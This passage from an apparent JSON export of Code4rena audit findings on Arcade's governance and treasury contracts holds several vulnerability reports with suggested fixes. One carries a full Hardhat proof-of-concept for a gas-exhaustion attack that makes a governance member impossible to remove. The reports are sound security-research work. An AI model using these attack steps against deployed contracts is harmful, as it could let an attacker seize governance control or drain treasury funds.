judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-07-arcade-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L697   # Vulnerability details  ## Impact NFTBoostVault may be unable to receive NFT cause it can't handle supportsInterface required by the ERC-1155 specification.  ## Proof of Concept In the [ERC-1155](https://eips.ethereum.org/EIPS/eip-1155#erc-1155-token-receiver) spec, it states:  ``` Smart contracts MUST implement all of the functions in the ERC1155TokenReceiver interface to accept transfers. See \u201cSafe Transfer Rules\u201d for further detail.  Smart contracts MUST implement the ERC-165 supportsInterface function and signify support for the ERC1155TokenReceiver interface to accept transfers. See \u201cERC1155TokenReceiver ERC-165 rules\u201d for further detail.  The implementation MUST call the function supportsInterface(0x4e2312e0) on the recipient contract, providing at least 10,000 gas.  Etc. ``` As shown above when transfer tokens to a ERC-1155 receiver, the implementation contract will use supportsInterface to decide if the receiver can receive the tokens. But NFTBoostVault.sol doesn't implement the function, which can lead to DoS.  We can add a test in test/NftBoostVault.ts:  ```typescript         it(\"ERC1155TokenReceiver ERC-165 rules\", async () => {             const { signers, nftBoostVault, reputationNft, mintNfts, setMultipliers } = ctxGovernance;             await nftBoostVault.connect(signers[0]).supportsInterface(\"0x01ffc9a7\").to.be.true;             await nftBoostVault.connect(signers[0]).supportsInterface(\"0x4e2312e0\").to.be.true;         });  ```  The output is:  ```   Governance Operations with NFT Boost Voting Vault     Governance flow with NFT boost vault       1) ERC1155TokenReceiver ERC-165 rules     0 passing (2s)   1 failing    1) Governance Operations with NFT Boost Voting Vault        Governance flow with NFT boost vault          ERC1155TokenReceiver ERC-165 rules:      TypeError: nftBoostVault.connect(...).supportsInterface is not a function       at /home/qiuhao/web3/c4/2023-07-arcade/test/NftBoostVault.ts:185:53       at Generator.next (<anonymous>)       at /home/qiuhao/web3/c4/2023-07-arcade/test/NftBoostVault.ts:8:71       at new Promise (<anonymous>)       at __awaiter (test/NftBoostVault.ts:4:12)       at Context.<anonymous> (test/NftBoostVault.ts:183:61) ```  ## Tools Used Manual Review.  ## Recommended Mitigation Steps Implement the supportsInterface according to ERC1155TokenReceiver ERC-165 rules:  ```solidity   function supportsInterface(bytes4 interfaceID) external view returns (bool) {       return  interfaceID == 0x01ffc9a7 ||    // ERC-165 support (i.e. `bytes4(keccak256('supportsInterface(bytes4)'))`).               interfaceID == 0x4e2312e0;      // ERC-1155 `ERC1155TokenReceiver` support (i.e. `bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\")) ^ bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"))`).   } ```  Also, it would be better to implement onERC1155BatchReceived to comply with the spec fully.   ## Assessed type  Token-Transfer"}, {"title": "Proposal vote power can be easily manipulated", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/434", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-07-arcade-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeGSCCoreVoting.sol#L32 https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/CoreVoting.sol#L172-L181 https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/CoreVoting.sol#L234-L238   # Vulnerability details  ## Impact `ArcadeGSCCoreVoting` can be a target of vote manipulation: an attacker might be able to take a huge loan (even uncollateralized) for a single block before creating a proposal.  When voting, only this single block is checked when calculating the `votingPower`: this may lead to an attacker being able to execute arbitrary proposals with minimal risks involved.  ## Proof of Concept  When a proposal is created, the timestamp registered is the block before the creation. This mitigates flash loan attacks, but it's still possible to manipulate the vote with a normal loan:  ```solidity proposals[proposalCount] = Proposal(     proposalHash,     // Note we use blocknumber - 1 here as a flash loan mitigation.     uint128(block.number - 1), //@audit created     uint128(block.number + lockDuration),     uint128(block.number + lockDuration + extraVoteTime),     uint128(quorum),     proposals[proposalCount].votingPower,     uint128(lastCall) ); ``` https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/CoreVoting.sol#L172-L181  During a `vote`, the `msg.sender` voting power is queried and it will use the previous `created` field:  ```solidity for (uint256 i = 0; i < votingVaults.length; i++) {     // ensure there are no voting vault duplicates     for (uint256 j = i + 1; j < votingVaults.length; j++) {         require(votingVaults[i] != votingVaults[j], \"duplicate vault\");     }     require(approvedVaults[votingVaults[i]], \"unverified vault\");     votingPower += uint128(         IVotingVault(votingVaults[i]).queryVotePower(             msg.sender,             proposals[proposalId].created,             extraVaultData[i]         )     ); } ``` https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/CoreVoting.sol#L234-L238  If the attacker took a huge loan (even uncollateralized) for that single block, they would be able to manipulate the vote with minimal slippage, as it's only one block.  If this happens, they would be able to execute any arbitrary code, if `queryVotePower` depends on the amount of tokens held by the attacker.  ## Note about severity  By reading the comments in `ArcadeGSCCoreVoting` it seems that the voting vault used will be the `ArcadeGSCVault`:  ```solidity  * The Arcade GSC Core Voting contract allows members of the GSC vault to vote on and execute proposals  * in an instance of governance separate from general governance votes. ```  In this case, this issue can't occur, as the `votingPower` does not depend on the amount held by the attacker:  ```solidity // If the address queried is the owner they get a huge number of votes // This allows the primary governance timelock to take any action the GSC // can make or block any action the GSC can make. But takes as many votes as // a protocol upgrade. if (who == owner) {     return 100000; } // If the who has been in the GSC longer than idleDuration // return 1 and otherwise return 0. if (     members[who].joined > 0 &&     (members[who].joined + idleDuration) <= block.timestamp ) {     return 1; } else {     return 0; }     ``` https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/vaults/GSCVault.sol#L145-L167  However, it's worth noting that this situation might change in the future, as `ArcadeGSCCoreVoting` approved vaults can be multiple, and they are not immutable:  ```solidity /// @notice Updates the status of a voting vault. /// @param vault Address of the voting vault. /// @param isValid True to be valid, false otherwise. function changeVaultStatus(address vault, bool isValid) external onlyOwner {     approvedVaults[vault] = isValid; } ```  https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/CoreVoting.sol#L333-L338  As there are other vaults that use tokens as voting power (e.g [LockingVault](https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/vaults/LockingVault.sol#L72-L86)), there is a real possibility that this might occur in the future, so I'm flagging it as high severity.   ## Tools Used Manual review  ## Recommended Mitigation Steps Consider using a TWAP to check the voting power of a proposal, instead of checking only the block before the proposal was created.   ## Assessed type  Timing"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/422", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-03"], "target": "2023-07-arcade-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-arcade-findings/blob/main/data/DadeKuma-Q.md)."}, {"title": "Missing `payable` on `ArcadeTreasury::batchCalls()` limits its use, preventing to execute actions that require ETH", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/421", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-07-arcade-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeTreasury.sol#L341   # Vulnerability details  ## Summary  `ArcadeTreasury::batchCalls()` is a function to execute arbitrary calls from the treasury.  The function is lacking a `payable` modifier, and the `.call()` instruction is not providing the `value`.  This means that the function is unable to make calls that require ETH to be provided, limiting its use.  ## Impact  `batchCalls()` functionality is limited, as it can't execute calls to contracts that require a `msg.value` to be provided.  ## Proof of Concept  Missing `payable` and `value` on `batchCalls()`:  ```solidity     function batchCalls(         address[] memory targets,         bytes[] calldata calldatas @>  ) external onlyRole(ADMIN_ROLE) nonReentrant { // @audit missing `payable`         if (targets.length != calldatas.length) revert T_ArrayLengthMismatch();         // execute a package of low level calls         for (uint256 i = 0; i < targets.length; ++i) {             if (spendThresholds[targets[i]].small != 0) revert T_InvalidTarget(targets[i]); @>          (bool success, ) = targets[i].call(calldatas[i]); // @audit missing `value`             // revert if a single call fails             if (!success) revert T_CallFailed();         }     } ```  [ArcadeTreasury.sol#L341](https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeTreasury.sol#L341)  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Add a `payable` modifier to the function, and provide the corresponding `value` for each of its calls, verifying they sum up to the provided `msg.value` to the function.   ## Assessed type  Payable"}, {"title": "If someone becomes GSC member, he may become unkickable forever", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/412", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-07-arcade-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/BaseVotingVault.sol#L96-L102 https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/external/council/vaults/GSCVault.sol#L123 https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/external/council/libraries/History.sol#L198-L199 https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/ArcadeGSCVault.sol#L25   # Vulnerability details  *Note: some of the contracts mentioned are out of scope, but the vulnerability exists in the `BaseVotingVault`, which is in-scope, so I argue that the finding is in scope.*  In Arcade ecosystem, there is a GSC group which has some extra privileges like spending some token amount from treasury or creating new proposals in core voting contract.  In order to become a member of this group, user has to have high enough voting power (combined from several voting vaults) and call `proveMembership`. When user's voting power drops beneath a certain threshold, he may be kicked out of the GSC.  `proveMembership` contains the following code: ```solidity for (uint256 i = 0; i < votingVaults.length; i++) {             // Call the vault to check last block's voting power             // Last block to ensure there's no flash loan or other             // intra contract interaction             uint256 votes =                 IVotingVault(votingVaults[i]).queryVotePower(                     msg.sender,                     block.number - 1,                     extraData[i]                 );             // Add up the votes             totalVotes += votes;         } ``` So, it basically iterates over all voting vaults that a user specifies, sums up his voting power, and if it's enough, it grants that user a place in GSC.  In order to kick user out from the GSC, the `kick` function may be used and it will iterate over all vaults that were supplied by a user when he called `proveMembership` and if his voting power dropped beneath the threshold, he will be removed from the GSC. `kick` contains the following code: ```solidity         for (uint256 i = 0; i < votingVaults.length; i++) {             // If the vault is not approved we don't count its votes now             if (coreVoting.approvedVaults(votingVaults[i])) {                 // Call the vault to check last block's voting power                 // Last block to ensure there's no flash loan or other                 // intra contract interaction                 uint256 votes =                     IVotingVault(votingVaults[i]).queryVotePower(                         who,                         block.number - 1,                         extraData[i]                     );                 // Add up the votes                 totalVotes += votes;             }         } ``` As we see, `queryVotePower` will be called again on each vault. Let's see how `queryVotePower` is implemented in `BaseVotingVault` which is used as a base contract for some voting contracts: ```solidity     function queryVotePower(address user, uint256 blockNumber, bytes calldata) external override returns (uint256) {         // Get our reference to historical data         History.HistoricalBalances memory votingPower = _votingPower();           // Find the historical data and clear everything more than 'staleBlockLag' into the past         return votingPower.findAndClear(user, blockNumber, block.number - staleBlockLag);     } ``` As we see, it will always call the `findAndClear` function that will return the most recent voting power and will attempt to erase some older entries. New entries are added for a user when his voting power changes and no more than `1` entry is added each block (if several changes happen in one block, values are just updated).  Now, attacker (Bob) may perform the following attack: 1. He acquires enough votes to become GSC member (he can either just buy enough tokens or deploy a smart contract that will offer high yield for users who stake their vault tokens there). 2. He calls `proveMembership` and specifies `NFTBoostVault` as a proof. He will be accepted. 3. He \"poisons\" his voting power history by delegating from and redelegating to himself some dust token amount in several thousand different blocks (possible to do in less than `12h` on Ethereum). 4. He withdraws all his tokens from `NFTBoostVault`. 5. Alice spots that Bob doesn't have enough voting power anymore and will attempt to kick him, but since `findAndClear` will try to erase several thousand entries, it will exceed Ethereum block limit for gas and the transaction will revert with Out Of Gas exception (`kick` will iterate over all vaults supplied by Bob, so Alice is forced to call `queryVotePower` on the vault that Bob used for the attack). 6. Bob can now send tokens to his another account, repeat the attack and he can do this until he has `>50%` in the GSC.  Similar exploit was presented by me in a different submission, but this one is different, since the previous one focused on different aspect of that DoS attack - changing voting outcome. Here, I'm showing how somebody can permanently become a GSC member.  As reported in that different submission, the cost of performing the attack once is `~14ETH`, so it's not that much (currently `14ETH = $1880 * 14 = $26320`), but it may be worth it to perform this attack in order to be able to get `>50%` of GSC.   ## Impact Attacker is able to become a permanent GSC member, even if he doesn't stake any tokens, which shouldn't be allowed and already has a huge impact on the protocol.  Even worse, he may try to acquire `> 50%` of voting power (GSC shouldn't have too many members - probably about `10` or something like this). Still, the GSC owner has `100000` votes, but it is a timelock contract, so might not be able to react fast enough to veto malicious proposals and even if it is, this attack will destroy the entire GSC (since, from now on, the owner will decide about everything making GSC members useless), which is an important concept in the Arcade protocol.  Hence, the impact is huge (and assets can be lost, since GSC is able to spend some tokens from the treasury) and there aren't any external factors allowed. So, I'm submitting this issue as High.  ## Proof of Concept Several modifications are necessary in order to run the test - they are only introduced to make testing easier and don't have anything in common with the attack itself. First of all, please change `Authorizable::setOwner` as follows: ```solidity     function setOwner(address who) public /*onlyOwner()*/ { ``` Then, please change `NFTBoostVault` so that withdrawals are possible: ```solidity constructor(         IERC20 token,         uint256 staleBlockLag,         address timelock,         address manager     ) BaseVotingVault(token, staleBlockLag) {         if (timelock == address(0)) revert NBV_ZeroAddress(\"timelock\");         if (manager == address(0)) revert NBV_ZeroAddress(\"manager\");          Storage.set(Storage.uint256Ptr(\"initialized\"), 1);         Storage.set(Storage.addressPtr(\"timelock\"), timelock);         Storage.set(Storage.addressPtr(\"manager\"), manager);         Storage.set(Storage.uint256Ptr(\"entered\"), 1);         Storage.set(Storage.uint256Ptr(\"locked\"), 0); // line changed     } ``` Then, please add a basic `ERC20` token implementation to a `TestERC20.sol` file in the `contracts/test` directory (it's only used to mint some tokens to the users): ```solidity // SPDX-License-Identifier: MIT  pragma solidity 0.8.18;  import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";  contract TestERC20 is ERC20  {     constructor() ERC20(\"TestERC20\", \"TERC20\") {              }      function mint(address to, uint256 amount) external {         _mint(to, amount);     } } ```  Finally, please put the following test inside `ArcadeGscVault.ts` (`import { mine } from \"@nomicfoundation/hardhat-network-helpers\";` will have to be also inserted there): ``` describe(\"Unkickable from GSC vault\", async () => {         it(\"Unkickable from GSC vault\", async () => {             const { coreVoting, arcadeGSCVault } = ctxGovernance;             const signers = await ethers.getSigners();             const owner = signers[0];             const Alice = signers[1];             const Bob = signers[2];              // balance of each user in TestERC20 custom token             const ALICES_BALANCE = ethers.utils.parseEther(\"1000000000\");             const BOBS_BALANCE = ethers.utils.parseEther(\"100\"); // enough to join GSC              const TestERC20Factory = await ethers.getContractFactory(\"TestERC20\");             const TestERC20 = await TestERC20Factory.deploy();              // mine some block in the future to resemble mainnet state             await mine(1_000_000);              // deploy NFTBoostVault with custom token (TestERC20) - we only need this token to provide some             // balance to users so that they can stake their tokens in the vault             const NFTBoostVaultFactory = await ethers.getContractFactory(\"NFTBoostVault\");             const NFTBoostVault = await NFTBoostVaultFactory.deploy(TestERC20.address, 10, owner.address, owner.address);              // set owner just to be able to call `changeVaultStatus`, so that testing is easier             await coreVoting.connect(owner).setOwner(owner.address);             await coreVoting.connect(owner).changeVaultStatus(NFTBoostVault.address, true);              // mint TestERC20 to users so that they can stake them             await TestERC20.connect(Alice).mint(Alice.address, ALICES_BALANCE);             await TestERC20.connect(Bob).mint(Bob.address, BOBS_BALANCE);              // everyone approves TestERC20, so that they can stake             await TestERC20.connect(Alice).approve(NFTBoostVault.address, ALICES_BALANCE);             await TestERC20.connect(Bob).approve(NFTBoostVault.address, BOBS_BALANCE);              // Alice and Bob add some tokens and delegate             await NFTBoostVault.connect(Alice).delegate(Alice.address);             await NFTBoostVault.connect(Alice).addTokens(ALICES_BALANCE);                          await NFTBoostVault.connect(Bob).delegate(Bob.address);             await NFTBoostVault.connect(Bob).addTokens(BOBS_BALANCE);                          // Alice becomes GSC member since she has enough voting power             expect(await arcadeGSCVault.members(Alice.address)).to.eq(0);             await arcadeGSCVault.connect(Alice).proveMembership([NFTBoostVault.address], [\"0x\"]);             expect(await arcadeGSCVault.members(Alice.address)).not.to.eq(0);              // Bob also becomes GSC member, but when he unstakes his tokens, Alice can kick him out             await arcadeGSCVault.connect(Bob).proveMembership([NFTBoostVault.address], [\"0x\"]);             expect(await arcadeGSCVault.members(Bob.address)).not.to.eq(0);              await NFTBoostVault.connect(Bob).withdraw(BOBS_BALANCE);             await arcadeGSCVault.connect(Alice).kick(Bob.address, [\"0x\"]);             expect(await arcadeGSCVault.members(Bob.address)).to.eq(0);             // kicking out Bob succeeds              // Bob adds tokens again and becomes GSC member, but this time performs the attack             await TestERC20.connect(Bob).approve(NFTBoostVault.address, BOBS_BALANCE);             await NFTBoostVault.connect(Bob).delegate(Bob.address);             await NFTBoostVault.connect(Bob).addTokens(BOBS_BALANCE);             await arcadeGSCVault.connect(Bob).proveMembership([NFTBoostVault.address], [\"0x\"]);              // attack             // Bob performs it on himself             var gasUsed = 0;             for (var i = 0; i < 3500; i++)             {                 const tx1 = await NFTBoostVault.connect(Bob).delegate(Alice.address); // needed since it's                  // impossible to change current delegatee to the same address                 const tx2 = await NFTBoostVault.connect(Bob).delegate(Bob.address);                 const r1 = await tx1.wait();                 const r2 = await tx2.wait();                 gasUsed += r1.cumulativeGasUsed.toNumber();                 gasUsed += r2.cumulativeGasUsed.toNumber();             }             console.log(`Gas used by the attacker: ${gasUsed}`);              // Bob withdraws his tokens             await NFTBoostVault.connect(Bob).withdraw(BOBS_BALANCE);                          // Alice cannot kick out Bob             await expect(arcadeGSCVault.connect(Alice).kick(Bob.address, [\"0x\"])).to.be.reverted;              // Bob is still GSC member; he can now transfer all his tokens to another account and perform             // the attack again until he controls > 50% of GSC             expect(await arcadeGSCVault.members(Bob.address)).not.to.eq(0);          }).timeout(400000);     }); ```  ## Tools Used VS Code, hardhat  ## Recommended Mitigation Steps Change `BaseVotingVault::queryVotePower` implementation so that it calls `find` instead of `findAndClear` (as in the `queryVotePowerView`).   ## Assessed type  DoS"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/389", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-09"], "target": "2023-07-arcade-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-arcade-findings/blob/main/data/0xComfyCat-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/343", "labels": ["bug", "grade-b", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-12"], "target": "2023-07-arcade-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-arcade-findings/blob/main/data/matrix_0wl-Q.md)."}, {"title": "`gscAllowance` CAN BE SET TO `thresholds.large` VALUE SINCE THERE IS NO EQUALITY CHECK FOR THE THREE THRESHOLD VALUES", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/340", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-07-arcade-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeTreasury.sol#L276-L278   # Vulnerability details  ## Impact  The `ArcadeTreasury.setThreshold` function is used to `set the spend/approve thresholds` for a token. It performs the following check to verify that the `thresholds are ascending from small to large`.          if (thresholds.large < thresholds.medium || thresholds.medium < thresholds.small) {             revert T_ThresholdsNotAscending();         }  But the issue is that ascending order is not strictly verified since `large == medium == small` could occur and the transaction will still proceed without revert.  Hence this will allow the ` gscAllowance[token] == thresholds.large` thus enabling the `GSC` to execute `larger spends` from the Treasury without going through the entire governance process. Hence as a result the `GSC` will be able to avoid governance voting for `larger spends`.  Hence now the `GSCAllowance` can be increased upto `threshold.large` value by calling the `setGSCAllowance`. And ones `GSCAllowance` is set to the `threshold.large` value, it can not be called again since there is a cool down period of 7 days.  ## Proof of Concept  ```solidity         if (thresholds.large < thresholds.medium || thresholds.medium < thresholds.small) {             revert T_ThresholdsNotAscending();         } ```  https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeTreasury.sol#L276-L278  ## Tools Used Manual Review and VSCode  ## Recommended Mitigation Steps  It is recommended to check the equality of the `large, medium and small` values of the threshold when they are being set in the `ArcadeTreasury.setThreshold` function as shown below:          if (thresholds.large <= thresholds.medium || thresholds.medium <= thresholds.small) {             revert T_ThresholdsNotAscending();         }  This will ensure thresholds are strictly in the ascending order from small to large.   ## Assessed type  Invalid Validation"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/274", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "edited-by-warden", "Q-10"], "target": "2023-07-arcade-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-arcade-findings/blob/main/data/LaScaloneta-Q.md)."}, {"title": "User who have claimed before the update on the merkle tree will have no shares of the rewards afterwards", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/213", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-07-arcade-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeAirdrop.sol#L75-L79   # Vulnerability details  ## Impact User who have claimed before an update on the merkle tree in [ArcadeAirdrop](https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeAirdrop.sol) are not gonna be able to claim the extra rewards. The reward tokens will be left stuck in the contract, waiting for the manager to reclaim them.  ## Proof of Concept Due to the nature of how [ArcadeAirdrop](https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeAirdrop.sol) is made and [the expectation](https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeAirdrop.sol#L17-L19) that there might be a change in the merkle tree in the near future, users will expect to be able to claim the extra rewards (if they are increase on merkle root change). However, because there is a problematic [if stamen](https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/libraries/ArcadeMerkleRewards.sol#L106-L107) (that is inherited in [ArcadeAirdrop](https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeAirdrop.sol) by [ArcadeMerkleRewards](https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/libraries/ArcadeMerkleRewards.sol)) users that have already claimed their rewards will have no share of the future ones.  Example:  1. Alice and Bob bolt have **100** tokens set to be claimed on the Merkle tree 2. Alice claims her **100** tokens 3. The owner sees that there is a huge activity on the platform and wants to incentivize users, so he increases rewards (by changing the merkle root) to **120** tokens 4. Bob claims his **120** tokens 5. Alice sees that and tries to claim the remainder of her **120** tokens (**20**), but the claim reverts because of this [if](https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/libraries/ArcadeMerkleRewards.sol#L106-L107)  ```jsx     function _validateWithdraw(uint256 totalGrant, bytes32[] memory merkleProof) internal {         ...         //@audit if the user has already claimed, he is not able to claim ever again         if (claimed[msg.sender] != 0) revert AA_AlreadyClaimed();         claimed[msg.sender] = totalGrant;     } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps Change the claim implementation the way how [mint](https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L98-L120) in **ReputationBadge** is done. They have the [total amount](https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L110C47-L110C61) in the merkle tree and track [claimed amount](https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L116C1-L116C1) in a mapping.    ## Assessed type  DoS"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/178", "labels": ["bug", "G (Gas Optimization)", "grade-a", "high quality report", "sponsor confirmed", "G-06"], "target": "2023-07-arcade-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-arcade-findings/blob/main/data/excalibor-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/152", "labels": ["bug", "grade-b", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-17"], "target": "2023-07-arcade-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-arcade-findings/blob/main/data/Sathish9098-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/126", "labels": ["bug", "grade-b", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-19"], "target": "2023-07-arcade-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-arcade-findings/blob/main/data/ABA-Q.md)."}, {"title": "ArcadeTreasury.sol allowance may be override", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/85", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-07-arcade-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/ArcadeTreasury.sol#L391   # Vulnerability details  ## Impact direct use of `IERC20(token).approve(spender, amount);` causes the same `spender` allowances to be overridden by each other  ## Proof of Concept In the `gscApprove()` method it is possible to give `spender` a certain allowance  The code is as follows:  ```solidity     function gscApprove(         address token,         address spender,         uint256 amount     ) external onlyRole(GSC_CORE_VOTING_ROLE) nonReentrant {         if (spender == address(0)) revert T_ZeroAddress(\"spender\");         if (amount == 0) revert T_ZeroAmount();          // Will underflow if amount is greater than remaining allowance @>      gscAllowance[token] -= amount;          _approve(token, spender, amount, spendThresholds[token].small);     }       function _approve(address token, address spender, uint256 amount, uint256 limit) internal {         // check that after processing this we will not have spent more than the block limit         uint256 spentThisBlock = blockExpenditure[block.number];         if (amount + spentThisBlock > limit) revert T_BlockSpendLimit();         blockExpenditure[block.number] = amount + spentThisBlock;          // approve tokens @>      IERC20(token).approve(spender, amount);          emit TreasuryApproval(token, spender, amount);     }     ```  From the above code we can see that when executed `gscApprove` consumes `gscAllowance[]` and ultimately uses `IERC20(token).approve();` to give the `spender` allowance  Since the direct use is `IERC20.approve(spender, amount)`, the amount of the allowance is overwritten, whichever comes last  In the other methods `approveSmallSpend`,`approveMediumSpend`,`approveLargeSpend` also use `IERC20(token).approve();`, which causes them to override each other if targeting the same `spender`.  Even if there is a malicious `GSC_CORE_VOTING_ROLE`, it is possible to execute `gscApprove(amount=1 wei)` after `approveLargeSpend()` to reset to an allowance of only `1 wei`.   The recommendation is to use accumulation to avoid, intentionally or unintentionally, overwriting each other  ## Tools Used  ## Recommended Mitigation Steps  ```solidity     function _approve(address token, address spender, uint256 amount, uint256 limit) internal {         // check that after processing this we will not have spent more than the block limit         uint256 spentThisBlock = blockExpenditure[block.number];         if (amount + spentThisBlock > limit) revert T_BlockSpendLimit();         blockExpenditure[block.number] = amount + spentThisBlock;          // approve tokens -      IERC20(token).approve(spender, amount); +      uint256 old = IERC20(token).allowance(address(this),spender); +      IERC20(token).approve(spender,  old + amount);          emit TreasuryApproval(token, spender, amount);     }  ```   ## Assessed type  Context"}, {"title": "Approved gscApprove allowance to an address may not able to be decreased", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/58", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "M-08"], "target": "2023-07-arcade-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/ArcadeTreasury.sol#L189-L201   # Vulnerability details  ## Impact Approved gscApprove allowance to an address may not able to be decreased.  ## Proof of Concept **GSC_CORE_VOTING_ROLE** calls [gscApprove(...)]() function to approve tokens to be pulled from the treasury: ```     function gscApprove(         address token,         address spender,         uint256 amount     ) external onlyRole(GSC_CORE_VOTING_ROLE) nonReentrant {         if (spender == address(0)) revert T_ZeroAddress(\"spender\");         if (amount == 0) revert T_ZeroAmount();           // Will underflow if amount is greater than remaining allowance         gscAllowance[token] -= amount;           _approve(token, spender, amount, spendThresholds[token].small);     } ``` Each approval will decrease the `gscAllowance[token]` by the approved allowance amount, this is problematic as **GSC_CORE_VOTING_ROLE** may not able to decrease the approved allowance.  Consider the following scenario: 1. `gscAllowance[token]` is 100; 2. **GSC_CORE_VOTING_ROLE** calls **gscApprove(...)** to give 60 allowance to a third party; 3. `gscAllowance[token]` is 40 now; 4. Later **GSC_CORE_VOTING_ROLE** finds the approved allowance is a bit too high and want to decrease the allowance to 50; 5. **gscApprove(...)** is called again but the ransaction reverts due to underflow error (`gscAllowance[token]` is less than 50)  Please see the tests: ``` contract ArcadeTreasuryTest is Test {     address timelock = address(1);     address coreVoting = address(2);     address gscCoreVoting = address(3);     address other = address(4);      ArcadeTreasury treasury;     MockToken mockToken;      function setUp() public {         treasury = new ArcadeTreasury(timelock);          vm.startPrank(timelock);         treasury.grantRole(treasury.CORE_VOTING_ROLE(), coreVoting);         treasury.grantRole(treasury.GSC_CORE_VOTING_ROLE(), gscCoreVoting);          mockToken = new MockToken(\"Mock Token\", \"MT\");         IArcadeTreasury.SpendThreshold memory threshold = IArcadeTreasury.SpendThreshold(100 ether, 200 ether, 300 ether);         treasury.setThreshold(address(mockToken), threshold);         vm.stopPrank();     }      function testGscApprove() public {         vm.warp(7 days);          vm.prank(timelock);         